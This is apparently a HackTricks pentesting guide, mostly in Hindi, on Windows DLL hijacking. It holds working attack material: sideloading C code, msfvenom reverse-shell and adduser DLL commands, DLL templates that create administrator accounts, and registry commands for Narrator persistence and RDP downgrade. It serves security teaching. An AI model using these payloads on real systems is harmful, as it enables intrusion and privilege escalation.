# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## मूल जानकारी

DLL Hijacking में एक विश्वसनीय एप्लिकेशन को एक malicious DLL लोड कराने के लिए मैनीपुलेट करना शामिल है। यह शब्द कई टैक्टिक्स को समेटता है जैसे कि **DLL Spoofing, Injection, and Side-Loading**। इसे मुख्यतः **code execution**, persistence प्राप्त करने और कम सामान्य रूप से **privilege escalation** के लिए उपयोग किया जाता है। यहाँ भले ही फोकस escalation पर हो, पर hijacking की विधि लक्ष्य के अनुसार समान रहती है।

### सामान्य तकनीकें

DLL hijacking के लिए कई तरीके उपयोग किए जाते हैं, और इनकी प्रभावशीलता एप्लिकेशन के DLL लोडिंग स्ट्रेटेजी पर निर्भर करती है:

1. **DLL Replacement**: असली DLL को malicious वाले से बदलना, वैकल्पिक रूप से मूल DLL की functionality बचाने के लिए DLL Proxying का उपयोग करना।
2. **DLL Search Order Hijacking**: malicious DLL को उस search path में रख देना जो legitimate DLL से पहले खोजा जाता है, ताकि एप्लिकेशन गलत DLL लोड कर ले।
3. **Phantom DLL Hijacking**: ऐसे malicious DLL बनाना जिसे एप्लिकेशन लोड करे क्योंकि एप्लिकेशन को लगता है कि वह एक आवश्यक (लेकिन गैर-मौजूद) DLL है।
4. **DLL Redirection**: खोज पैरामीटर जैसे `%PATH%` या `.exe.manifest` / `.exe.local` फ़ाइलों को बदलकर एप्लिकेशन को malicious DLL की ओर निर्देशित करना।
5. **WinSxS DLL Replacement**: WinSxS डायरेक्टरी में legitimate DLL की जगह malicious DLL रखना, यह तरीका अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: malicious DLL को यूज़र-कंट्रोल्ड डायरेक्टरी में रखना जहाँ एप्लिकेशन की कॉपी होती है, यह Binary Proxy Execution तकनीकों जैसा दिखता है।

## Finding missing Dlls

सिस्टम के अंदर missing Dlls खोजने का सबसे आम तरीका sysinternals से [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना है, और निम्न 2 फ़िल्टर **set** करना:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

और केवल **File System Activity** दिखाएँ:

![](<../../../images/image (153).png>)

यदि आप सामान्य रूप से **missing dlls** ढूँढ रहे हैं तो इसे कुछ **सेकंड** के लिए चलने दें।\
यदि आप किसी विशेष executable के अंदर **missing dll** ढूँढ रहे हैं तो आपको एक और फ़िल्टर सेट करना चाहिए जैसे "Process Name" "contains" `<exec name>`, इसे execute करें, और events को capture करना बंद कर दें।

## Exploiting Missing Dlls

privileges escalate करने के लिए, सबसे अच्छी संभावना यह है कि हम ऐसी जगह किसी privilege process द्वारा लोड किए जाने वाले DLL को लिख सकें जहाँ वह खोजा जाएगा। इसलिए, हम या तो उस फोल्डर में एक dll लिख पाएँगे जहाँ वह DLL उस फोल्डर से पहले खोजा जाता है जहाँ मूल DLL मौजूद है (अजीब केस), या हम ऐसे किसी फोल्डर में लिख पाएँगे जहाँ DLL खोजा जाएगा और मूल **dll किसी भी फोल्डर में मौजूद नहीं है**।

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows applications DLLs को predefined search paths की एक श्रृंखला के अनुसार खोजते हैं, एक विशेष क्रम का पालन करते हुए। DLL hijacking की समस्या तब उत्पन्न होती है जब एक हानिकारक DLL को रणनीतिक रूप से उन डायरेक्टरीज़ में से किसी एक में रखा जाए ताकि वह असली DLL से पहले लोड हो जाए। इसको रोकने का एक समाधान यह है कि एप्लिकेशन आवश्यक DLLs का संदर्भ देते समय absolute paths का उपयोग करे।

आप 32-bit सिस्टम पर **DLL search order** नीचे देख सकते हैं:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

यह **default** search order है जब **SafeDllSearchMode** enabled होता है। जब यह disabled होता है तो current directory दूसरे स्थान पर आ जाती है। इस फीचर को disable करने के लिए, **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाइए और इसे 0 पर सेट कर दीजिए (डिफ़ॉल्ट enabled है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ कॉल किया जाता है तो खोज उस executable module की directory से शुरू होती है जिसे **LoadLibraryEx** लोड कर रहा है।

अंत में, ध्यान दें कि **a dll could be loaded indicating the absolute path instead just the name**. उस स्थिति में वह dll केवल उसी path में ही खोजा जाएगा (यदि उस dll के कोई dependencies हैं, तो उन्हें नाम से लोड होने के रूप में खोजा जाएगा)।

अन्य तरीके भी हैं search order को बदलने के, लेकिन मैं उन्हें यहाँ विस्तार से नहीं समझाऊँगा।

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

एक उन्नत तरीका किसी newly created process के DLL search path को निश्चित रूप से प्रभावित करने का यह है कि ntdll के native APIs से process create करते समय RTL_USER_PROCESS_PARAMETERS में DllPath फील्ड सेट किया जाए। यहाँ attacker-controlled directory प्रदान करके, एक target process जिसे imported DLL नाम से resolve करना है (absolute path नहीं और safe loading flags का उपयोग नहीं कर रहा), उसे उस डायरेक्टरी से malicious DLL लोड करने के लिए मजबूर किया जा सकता है।

Key idea
- RtlCreateProcessParametersEx के साथ process parameters बनाइए और एक custom DllPath प्रदान कीजिए जो आपके controlled फोल्डर की ओर इशारा करता हो (उदाहरण के लिए, वही डायरेक्टरी जहाँ आपका dropper/unpacker रहता है)।
- RtlCreateUserProcess के साथ process बनाइए। जब target binary किसी DLL को नाम से resolve करेगा, loader resolution के दौरान प्रदान किए गए DllPath से consult करेगा, जिससे reliable sideloading संभव हो जाएगा भले ही malicious DLL target EXE के साथ colocated न हो।

Notes/limitations
- यह केवल बनाए जा रहे child process को प्रभावित करता है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- लक्ष्य को नाम से import या LoadLibrary करना चाहिए (absolute path नहीं और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग नहीं कर रहा हो)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence बदल सकते हैं।

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

ऑपरेशनल उपयोग उदाहरण
- अपने DllPath डायरेक्टरी में एक दुर्भावनापूर्ण xmllite.dll रखें (जो आवश्यक फ़ंक्शनों को export करे या असली वाले का proxy करे)।
- ऊपर बताई गई तकनीक का उपयोग करते हुए उस signed binary को लॉन्च करें जिसे नाम से xmllite.dll खोजने के लिए जाना जाता है। loader सप्लाई किए गए DllPath के माध्यम से import को resolve करता है और आपका DLL sideload कर देता है।

यह तकनीक वास्तविक दुनिया में multi-stage sideloading chains चलाने के लिए देखी गई है: एक प्रारंभिक launcher एक helper DLL गिराता है, जो फिर एक Microsoft-signed, hijackable binary उत्पन्न करता है जिसके पास एक custom DllPath होता है ताकि attacker की DLL को एक staging directory से लोड करने के लिए मजबूर किया जा सके।


#### Exceptions on dll search order from Windows docs

Windows documentation में मानक DLL खोज क्रम के कुछ अपवाद दिए गए हैं:

- जब कोई **DLL जिसका नाम पहले से memory में लोड एक DLL के नाम के समान होता है** मिलता है, तो सिस्टम सामान्य खोज को बायपास कर देता है। इसके बजाय, यह redirection और manifest के लिए चेक करता है, और फिर default के रूप में पहले से memory में मौजूद DLL का उपयोग करता है। **इस परिदृश्य में, सिस्टम DLL के लिए कोई खोज नहीं करता है**।
- अगर DLL को current Windows version के लिए **known DLL** के रूप में पहचाना जाता है, तो सिस्टम known DLL का अपना संस्करण और उसके किसी भी dependent DLLs का उपयोग करेगा, **search process को छोड़ते हुए**। रजिस्ट्री key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** इन known DLLs की सूची रखता है।
- यदि किसी **DLL के dependencies हैं**, तो इन dependent DLLs की खोज उसी तरह की जाती है जैसे कि उन्हें केवल उनके **module names** द्वारा संकेत किया गया हो, चाहे प्रारंभिक DLL को पूरा path देकर पहचाना गया हो या नहीं।

### अधिकार वृद्धि

**आवश्यकताएँ**:

- एक ऐसा process पहचानें जो अलग **privileges** के तहत चलता है या चलेगा (horizontal या lateral movement), और जिसमें **एक DLL नहीं है**।
- सुनिश्चित करें कि उस किसी भी **directory** के लिए **write access** उपलब्ध हो जहाँ **DLL** की **खोज** की जाएगी। यह स्थान executable की directory या system path के भीतर किसी directory में हो सकता है।

हाँ, आवश्यकताएँ ढूँढना जटिल है क्योंकि **डिफ़ॉल्ट रूप से किसी privileged executable को बिना DLL के पाना अजीब है** और system path फ़ोल्डर पर write permissions होना और भी **अधिक अजीब** (आप डिफ़ॉल्ट रूप से ऐसा नहीं कर सकते)। लेकिन, misconfigured environments में यह संभव है.\\
यदि आप भाग्यशाली हैं और आवश्यकताएँ पूरी हो रही हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) प्रोजेक्ट देख सकते हैं। भले ही परियोजना का **main goal UAC bypass करना है**, आप वहाँ Windows version के लिए Dll hijaking का एक **PoC** पा सकते हैं जिसे आप उपयोग कर सकते हैं (शायद बस उस फ़ोल्डर के path को बदलकर जिसमें आपके पास write permissions हैं)।

ध्यान दें कि आप किसी फ़ोल्डर में **अपनी permissions की जाँच** कर सकते हैं ऐसा करके:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर मौजूद सभी फ़ोल्डरों की अनुमति(permissions) जांचें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप किसी executable के imports और किसी dll के exports भी जांच सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **Dll Hijacking का दुरुपयोग करके अनुमतियाँ बढ़ाने** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

यदि आप कोई exploitable scenario पाते हैं तो इसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण बातों में से एक होगी **ऐसा dll बनाना जो कम-से-कम उन सभी functions को export करे जिन्हें executable उससे import करेगा**। ध्यान दें कि Dll Hijacking तब उपयोगी होता है जब [Medium Integrity level से High **(bypassing UAC)** तक escalate करना हो](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity से SYSTEM** तक](../index.html#from-high-integrity-to-system)**.** आप एक उदाहरण पा सकते हैं कि **valid dll कैसे बनाएं** इस dll hijacking स्टडी में जो execution के लिए dll hijacking पर केंद्रित है: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Dlls बनाना और कम्पाइल करना**

### **Dll Proxifying**

मूल रूप से एक **Dll proxy** एक ऐसा Dll होता है जो लोड होने पर आपका malicious code execute कर सके और साथ ही वास्तविक लाइब्रेरी को relay करके सभी कॉल्स को आगे भेजते हुए अपेक्षित व्यवहार के रूप में **expose** और **work** कर सके।

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक meterpreter (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएं (x86 — मैंने x64 संस्करण नहीं देखा):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### अपना

ध्यान दें कि कई मामलों में वह Dll जिसे आप compile करते हैं, उसे उन कार्यों को **export several functions** करना होगा जो victim process द्वारा लोड किए जाने वाले हैं; यदि ये functions मौजूद नहीं हैं तो **binary won't be able to load** उन्हें और **exploit will fail**।

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL उदाहरण (उपयोगकर्ता निर्माण के साथ)</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>थ्रेड एंट्री के साथ वैकल्पिक C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe अभी भी शुरू होते समय एक पूर्वानुमानित, भाषा-विशिष्ट localization DLL को प्रोब करता है, जिसे hijack करके arbitrary code execution और persistence प्राप्त किया जा सकता है।

Key facts
- प्रोब पथ (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- लेगेसी पथ (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- यदि OneCore पथ पर writable, attacker-controlled DLL मौजूद है, तो वह लोड हो जाती है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। किसी exports की आवश्यकता नहीं है।

Discovery with Procmon
- फ़िल्टर: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator शुरू करें और ऊपर दिये पथ के लोड होने के प्रयास को देखें।

न्यूनतम DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack UI पर बोल/हाइलाइट करेगा। शांत रहने के लिए, attach करते समय Narrator थ्रेड्स को enumerate करें, मुख्य थ्रेड को खोलें (`OpenThread(THREAD_SUSPEND_RESUME)`) और उसे `SuspendThread` करें; अपनी खुद की थ्रेड में जारी रखें। पूरा कोड देखने के लिए PoC देखें।

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर दिए गए के साथ, Narrator शुरू करने पर प्लांट किया गया DLL लोड हो जाता है। secure desktop (logon screen) पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ।

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- होस्ट पर RDP करें, logon screen पर Narrator लॉन्च करने के लिए CTRL+WIN+ENTER दबाएँ; आपका DLL secure desktop पर SYSTEM के रूप में execute होगा।
- RDP सेशन बंद होते ही execution रुक जाती है — तुरंत inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप एक built-in Accessibility Tool (AT) registry entry (उदा., CursorIndicator) क्लोन कर सकते हैं, उसे किसी arbitrary binary/DLL की ओर पॉइंट करने के लिए एडिट करें, import करें, फिर `configuration` को उस AT नाम पर सेट करें। यह Accessibility framework के अंतर्गत arbitrary execution को proxy करता है।

Notes
- `%windir%\System32` के अंतर्गत लिखना और HKLM वैल्यूज़ बदलना admin अधिकार मांगता है।
- सारी payload लॉजिक `DLL_PROCESS_ATTACH` में रखी जा सकती है; किसी export की आवश्यकता नहीं है।

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

यह मामला Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में **Phantom DLL Hijacking** को दिखाता है, जिसे **CVE-2025-1729** के रूप में ट्रैक किया गया है।

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` स्थित है `C:\ProgramData\Lenovo\TPQM\Assistant\` पर।
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` रोज़ाना 9:30 AM पर चलती है लॉग-ऑन यूज़र के संदर्भ में।
- **Directory Permissions**: `CREATOR OWNER` द्वारा writable, जिससे लोकल यूज़र्स arbitrary फाइलें डाल सकते हैं।
- **DLL Search Behavior**: सबसे पहले इसके working directory से `hostfxr.dll` लोड करने का प्रयास करता है और यदि गायब है तो "NAME NOT FOUND" लॉग करता है, जो लोकल डायरेक्टरी खोज की प्राथमिकता को दर्शाता है।

### Exploit Implementation

एक attacker उसी डायरेक्टरी में एक malicious `hostfxr.dll` stub रख सकता है, मिसिंग DLL का फायदा उठाकर यूज़र के संदर्भ में कोड execution हासिल करने के लिए:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### हमला प्रवाह

1. एक सामान्य उपयोगकर्ता के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में डालें।
2. निर्धारित कार्य के वर्तमान उपयोगकर्ता के संदर्भ में सुबह 9:30 बजे चलने की प्रतीक्षा करें।
3. यदि कार्य निष्पादित होने पर कोई administrator लॉग इन है, तो malicious DLL administrator के सत्र में medium integrity पर चलती है।
4. standard UAC bypass techniques को chain करके medium integrity से SYSTEM privileges तक उन्नत करें।

## संदर्भ

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)


{{#include ../../../banners/hacktricks-training.md}}
